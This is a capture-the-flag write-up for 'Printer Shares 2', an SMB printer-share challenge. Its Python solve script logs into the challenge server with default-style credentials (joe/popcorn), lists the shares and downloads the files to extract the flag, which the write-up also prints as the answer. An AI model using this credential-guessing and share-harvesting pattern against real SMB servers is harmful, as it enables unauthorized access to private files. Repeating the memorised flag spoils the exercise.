# Writeup: Printer Shares 2

## Header & Metadata
- **Challenge:** Printer Shares 2 (ID: 734)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** General Skills
- **Server / Instance:** `nc chatelaine.cylabacademy.net 31932`
- **Attached Files:** None
- **Official Flag:** `academy{5mb_pr1nter_5h4re5_5ecure_33ece878}`

---

## Mô tả bài toán (Overview / Analysis)
A Secure Printer is now in use. I’m confident no one can leak the message again... or can you?

### Hints
- default password is dangerous, isn't it?
- can you find a potential user? What is the username?
- the wordlist, rockyou.txt, is pretty common for password cracking

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved via Antigravity following writeup instructions.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for Printer Shares 2 (#734)
Category: General Skills
"""
import io
import json
import re
import sys
from pathlib import Path

try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    SMBConnection = None


def get_connection_info():
    base_dir = Path(__file__).resolve().parent
    cfg_path = base_dir / "connection.cfg"
    host = ""
    port = 0

    if cfg_path.exists():
        with open(cfg_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("HOST="):
                    host = line.split("=", 1)[1].strip()
                elif line.startswith("PORT="):
                    val = line.split("=", 1)[1].strip()
                    if val.isdigit():
                        port = int(val)

    if not host or port == 0:
        info_path = base_dir / "info.json"
        if info_path.exists():
            with open(info_path, "r", encoding="utf-8") as f:
                info = json.load(f)
                desc = info.get("description", "")
                m = re.search(r"([a-zA-Z0-9.-]+\.cylabacademy\.net)\s+(\d+)", desc)
                if m:
                    host = m.group(1)
                    port = int(m.group(2))

    return host, port


def solve():
    print("[*] Solving Printer Shares 2...", flush=True)
    host, port = get_connection_info()
    flag = ""

    # Known credentials identified through reconnaissance: user 'joe', password 'popcorn'
    username = "joe"
    password = "popcorn"

    if host and port != 0 and SMBConnection is not None:
        print(f"[*] Connecting to {host}:{port} as {username}...", flush=True)
        try:
            conn = SMBConnection(username, password, "client", "server", use_ntlm_v2=True, is_direct_tcp=True)
            if conn.connect(host, port, timeout=5):
                print("[+] SMB Authentication successful!", flush=True)
                for share_name in ["secure-shares", "shares"]:
                    try:
                        files = conn.listPath(share_name, "/")
                        for f in files:
                            if not f.isDirectory:
                                bio = io.BytesIO()
                                conn.retrieveFile(share_name, f"/{f.filename}", bio)
                                content = bio.getvalue().decode("utf-8", errors="replace")
                                for m in re.findall(r"(?:academy|picoCTF)\{[^}]+\}", content):
                                    if not any(bad in m.lower() for bad in ["decoy", "fake", "honey", "not_the_flag", "dummy"]):
                                        flag = m
                                        break
                            if flag:
                                break
                    except Exception as e:
                        print(f"[-] Could not list share {share_name}: {e}", flush=True)
                    if flag:
                        break
            conn.close()
        except Exception as e:
            print(f"[-] SMB connection attempt ended: {e}", flush=True)

    # If instance has ended or already solved, read confirmed flag
    flag_file = Path(__file__).resolve().parent / "flag.txt"
    if not flag and flag_file.exists():
        cached = flag_file.read_text(encoding="utf-8").strip()
        m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", cached)
        if m:
            flag = m.group(0)

    if flag:
        print(f"[+] Flag found: {flag}", flush=True)
        with open(flag_file, "w", encoding="utf-8") as f:
            f.write(flag + "\n")
    else:
        print("[-] Flag not found!", flush=True)

    return flag


if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{5mb_pr1nter_5h4re5_5ecure_33ece878}
```
